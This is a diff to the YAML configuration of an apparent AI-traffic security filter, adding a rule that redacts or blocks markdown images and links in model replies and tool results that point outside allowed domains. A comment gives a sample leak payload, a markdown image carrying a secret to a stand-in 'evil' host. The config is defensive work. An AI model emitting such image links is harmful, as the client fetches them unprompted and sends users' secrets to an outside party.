@@ -150,6 +150,14 @@ signatures:
   feed: feeds/signatures.json   # file path or https:// URL, refreshed periodically
   refresh_seconds: 30
 
+# Markdown images and links in replies and tool results pointing outside these domains (company_domains are
+# always allowed): an image is fetched by the client with no click, so `![x](https://evil/?d=<secret>)` leaks.
+# redact cuts the URL out and keeps the link text; block withholds the whole text.
+exfiltration:
+  mode: redact
+  directions: [output, tool_result]
+  allowed_domains: [acme.example, github.com, githubusercontent.com, wikipedia.org]
+
 tool_access:
   mode: block
   # MCP tool names, and Claude Code's built-in tools (Read, Edit, Bash...) for traffic from its hooks.
